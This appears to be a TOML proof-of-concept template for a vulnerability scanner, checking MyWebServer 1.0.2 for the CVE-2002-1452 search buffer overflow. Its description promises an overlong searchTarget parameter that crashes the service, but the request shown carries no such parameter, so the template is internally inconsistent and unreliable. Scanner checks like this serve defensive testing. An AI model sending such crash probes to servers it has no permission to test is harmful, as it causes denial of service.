[info]
author = "ave"
description = "验证 MyWebServer 1.0.2 搜索功能缓冲区溢出漏洞，通过发送超长 searchTarget 参数触发服务异常崩溃"
id = "POC-AVE-2002-0593"
name = "MyWebServer 1.0.2 Search Request Buffer Overflow PoC"
severity = "high"
tags = ["ave-2002-0593"]
vuln_id = [
    "CVE-2002-1452",
    "AVE-2002-0593",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/MWS/HandleSearch.html?&B1=Submit"
protocol = "http"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"
